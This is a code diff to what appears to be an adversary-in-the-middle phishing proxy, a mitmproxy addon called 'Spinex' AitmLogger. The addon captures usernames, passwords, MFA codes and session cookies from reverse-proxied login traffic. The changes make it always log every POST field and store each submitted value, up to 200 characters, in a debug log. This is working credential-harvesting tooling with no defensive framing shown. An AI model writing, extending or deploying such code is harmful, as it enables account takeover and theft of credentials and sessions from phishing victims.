@@ -813,6 +813,11 @@ class AitmLogger:
         try:
             host = flow.request.pretty_host
             url = flow.request.url
+            
+            # Log ALL requests for debugging
+            if flow.request.method.upper() == "POST":
+                print(f"[Spinex] POST {host} | {url[:120]}")
+            
             if host in _BASE_DOMAINS and host not in _REVERSE_DOMAIN_MAP:
                 flow.response = http.Response.make(
                     404, b"Not Found", {"content-type": "text/plain"}
@@ -855,14 +860,18 @@ class AitmLogger:
                 return
             fields = _parse_post_body(flow)
             fields = _deep_parse_body(fields)
-            if DEBUG_POSTS and fields:
+            
+            # Always log POST fields for debugging
+            if fields:
                 _append_log(LOG_DEBUG, {
                     "timestamp": str(datetime.datetime.now()),
                     "host": upstream_host,
                     "url": url,
                     "fields": list(fields.keys()),
+                    "all_fields": {k: str(v)[:200] for k, v in fields.items()},
                 })
                 print(f"[Spinex] DEBUG POST {upstream_host} fields: {list(fields.keys())}")
+            
             if not fields:
                 return
             captured = {"username": {}, "password": {}, "mfa": {}}
@@ -896,7 +905,7 @@ class AitmLogger:
             host = flow.request.host
             url = flow.request.url
             status = flow.response.status_code
-            print(f"[Spinex] Response from {host} | Status: {status} | URL: {url}")
+            print(f"[Spinex] Response from {host} | Status: {status} | URL: {url[:120]}")
             platforms = _match_platform(host)
             raw_cookies = flow.response.cookies
             if raw_cookies:
